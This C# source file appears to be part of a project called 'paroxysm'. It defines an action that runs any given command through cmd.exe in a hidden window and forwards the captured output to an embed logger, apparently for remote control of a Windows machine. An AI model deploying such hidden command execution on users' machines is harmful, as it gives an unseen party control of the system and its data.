using paroxysm.Debug;
using System;
using System.Diagnostics;

namespace paroxysm.Hooks.Actions
{
    internal class ExecuteCommandAction
    {
        public static void Execute(string command)
        {
            if(command is null)
            {
                Logger.CreateEmbed(ELoggerState.Error, "Nie podano komendy");
                return;
            }

            try
            {
                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        Arguments = "/C" + command,
                    }
                };
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                if (output is null || output.Length == 0)
                {
                    Logger.CreateEmbed(ELoggerState.Error, "Komenda nie zwrócia wyniku lub nie istnieje");
                }

                Logger.CreateEmbed(ELoggerState.Info, output);

            } catch (Exception ex) 
            {
                Logger.CreateEmbed(ELoggerState.Error, ex);
            }
        }
    }
}
